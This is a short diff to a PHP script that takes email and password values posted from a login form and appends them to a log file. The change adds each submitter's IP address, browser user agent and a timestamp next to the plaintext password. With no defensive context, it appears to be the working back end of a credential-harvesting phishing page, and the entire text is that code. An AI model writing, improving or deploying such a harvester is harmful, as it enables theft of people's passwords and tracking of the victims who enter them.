@@ -1,6 +1,14 @@
 <?php
 $myfile = fopen("log/logfile.txt", "a+") or die("Unable to open file!");
-$txt = $_POST["inputEmail"] . ', ' .  $_POST["inputPassword"] . "\n";
+
+$email  = $_POST['inputEmail'];
+$pw     = $_POST['inputPassword'];
+$ip     = $_SERVER['REMOTE_ADDR'];
+$usragt = $_SERVER['HTTP_USER_AGENT'];
+$now    = date("Y-m-d H:i:s");
+
+$txt = sprintf("%s - %s -> email: %s, pw: %s \n%s\n", $now, $ip, $email, $pw, $usragt);
+
 fwrite($myfile, $txt);
 fclose($myfile);
 ?>
